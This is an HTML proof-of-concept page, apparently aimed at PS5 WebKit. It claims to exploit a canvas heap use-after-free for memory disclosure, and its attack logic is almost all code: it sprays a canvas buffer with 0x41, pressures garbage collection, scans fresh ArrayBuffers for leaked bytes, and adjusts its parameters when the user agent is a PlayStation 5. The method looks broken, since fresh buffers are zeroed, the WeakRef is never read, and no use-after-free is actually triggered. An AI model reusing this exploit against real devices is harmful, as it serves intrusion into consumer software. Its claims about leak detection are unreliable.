<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Canvas Heap UAF PoC Optimized</title>
  <style>
    body { font-family: sans-serif; padding: 20px; }
    button { padding: 10px; font-size: 16px; }
    #console { white-space: pre-wrap; font-family: monospace; border: 1px solid #ccc; padding: 10px; height: 300px; overflow-y: auto; margin-top: 10px; }
  </style>
</head>
<body>

<h1>Canvas Heap UAF PoC (Optimized)</h1>
<p>Target: PS5 WebKit | Safe Memory Disclosure Test</p>
<button onclick="runCycles(10)">Run Safe Cycles</button>
<div><strong>Status:</strong> <span id="status">Idle...</span></div>
<div><strong>Approx Memory Used:</strong> <span id="memUsage">0</span> MB</div>
<div id="console"></div>

<canvas id="canvas" width="512" height="512" style="display:none;"></canvas>

<script>
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
const status = document.getElementById('status');
const consoleDiv = document.getElementById('console');
const memUsage = document.getElementById('memUsage');

let approxMem = 0;

function log(msg) {
  consoleDiv.textContent += msg + '\n';
  consoleDiv.scrollTop = consoleDiv.scrollHeight;
}

function updateStatus(msg) {
  status.textContent = msg;
}

function updateMemoryDisplay() {
  memUsage.textContent = (approxMem / (1024 * 1024)).toFixed(2);
}

function fillImageData(imgData, value) {
  const view = new Uint8Array(imgData.data.buffer);
  view.fill(value);
}

function stressGC() {
  const junk = [];
  for (let i = 0; i < 200; i++) {
    junk.push(new ArrayBuffer(1024 * 512)); // 512 KB * 200 = ~100MB
    approxMem += 1024 * 512;
  }
  updateMemoryDisplay();
}

async function attemptMemoryDisclosure() {
  log('Starting UAF Memory Disclosure attempt...');

  const imgData = ctx.createImageData(512, 512);
  fillImageData(imgData, 0x41);

  const weakRef = new WeakRef(imgData);
  stressGC();

  const leakers = [];
  const leakerSize = 1024 * 32; // 32 KB
  const leakerCount = isPS5() ? 300 : 500;

  for (let i = 0; i < leakerCount; i++) {
    const buf = new ArrayBuffer(leakerSize);
    leakers.push(buf);
    approxMem += leakerSize;
  }

  updateMemoryDisplay();

  let leakDetected = false;

  for (let i = 0; i < leakers.length; i++) {
    const view = new Uint8Array(leakers[i]);
    for (let j = 0; j < view.length; j++) {
      if (view[j] === 0x41) {
        log(`Leak in buffer ${i}, byte ${j}`);
        leakDetected = true;
        break;
      }
    }
    if (leakDetected) break;
  }

  if (!leakDetected) {
    log('No leak detected in this attempt.');
  } else {
    log('*** Potential memory disclosure successful! ***');
  }
}

async function runCycles(cycles = 10) {
  approxMem = 0;
  updateMemoryDisplay();
  for (let c = 0; c < cycles; c++) {
    updateStatus(`Cycle ${c + 1} of ${cycles}`);
    log(`\n--- Cycle ${c + 1} ---`);
    await new Promise(resolve => setTimeout(resolve, 100));
    await attemptMemoryDisclosure();
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  updateStatus('Idle...');
}

function isPS5() {
  return navigator.userAgent.includes('PlayStation 5');
}

log(`User-Agent: ${navigator.userAgent}`);
if (isPS5()) {
  log('PS5 detected. Adjusting parameters...');
} else {
  log('Non-PS5 browser detected.');
}
</script>

</body>
</html>
